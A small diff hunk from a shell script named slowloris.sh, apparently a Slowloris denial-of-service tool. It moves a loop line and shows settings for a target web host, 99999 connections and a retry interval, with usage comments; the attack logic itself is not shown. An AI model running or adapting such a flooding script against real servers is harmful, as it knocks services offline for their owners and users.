@@ -4,9 +4,9 @@
 # chmod 777 slowloris.sh
 # ./slowloris.sh
 
+while true; do
 LHOST=127.0.0.1
 LPORT=9991
-while true; do
 TARJET=web.hackingyseguridad.com
 CONNS=99999
 INTERVAL=99
